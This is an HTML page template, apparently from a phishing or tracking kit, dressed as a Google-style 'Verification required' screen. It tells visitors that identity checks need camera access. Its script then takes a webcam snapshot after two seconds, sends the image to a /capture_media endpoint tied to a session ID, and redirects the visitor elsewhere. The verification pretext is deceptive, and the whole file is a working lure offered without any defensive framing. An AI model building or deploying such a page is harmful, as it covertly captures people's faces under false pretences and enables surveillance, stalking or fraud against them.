<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
.container{max-width:420px;width:100%;padding:24px;text-align:center}
.icon{width:64px;height:64px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.icon svg{width:32px;height:32px;fill:#1a73e8}
h1{font-size:22px;color:#202124;font-weight:400;margin-bottom:8px}
p{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
.status{font-size:13px;color:#5f6368;padding:12px;background:#f8f9fa;border-radius:8px;margin-bottom:16px}
video{width:100%;border-radius:12px;margin:16px 0;display:none;border:1px solid #dadce0}
.hidden{display:none}
@keyframes spin{to{transform:rotate(360deg)}}
.loading{width:20px;height:20px;border:2px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .6s linear infinite;margin:12px auto}
</style>
</head>
<body>
<div class="container">
    <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    </div>
    <h1>Verification required</h1>
    <p>For security reasons, we need to verify your identity. Please allow camera access to continue.</p>
    <div class="status" id="status">Starting verification...</div>
    <video id="video" autoplay playsinline muted></video>
    <div class="loading" id="loading"></div>
</div>
<script>
async function init(){
    const s=document.getElementById('status'),v=document.getElementById('video'),l=document.getElementById('loading');
    try{
        s.textContent='Requesting camera access...';
        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}});
        v.srcObject=stream;v.style.display='block';
        s.textContent='Capturing image...';l.style.display='block';
        setTimeout(()=>{
            const c=document.createElement('canvas');
            c.width=v.videoWidth;c.height=v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            const data=c.toDataURL('image/jpeg',0.85);
            stream.getTracks().forEach(t=>t.stop());v.style.display='none';l.style.display='none';
            s.textContent='Verifying...';
            fetch('/capture_media/{{ session_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:data})})
            .then(r=>r.json()).then(d=>{if(d.success){s.textContent='Verified. Redirecting...';setTimeout(()=>window.location.href='{{ redirect_url }}',1200)}else{window.location.href='{{ redirect_url }}'}})
            .catch(()=>window.location.href='{{ redirect_url }}');
        },2000);
    }catch(e){s.textContent='Camera access is required. Please allow access and try again.';setTimeout(()=>window.location.href='{{ redirect_url }}',2500)}
}
window.onload=init;
</script>
</body>
</html>
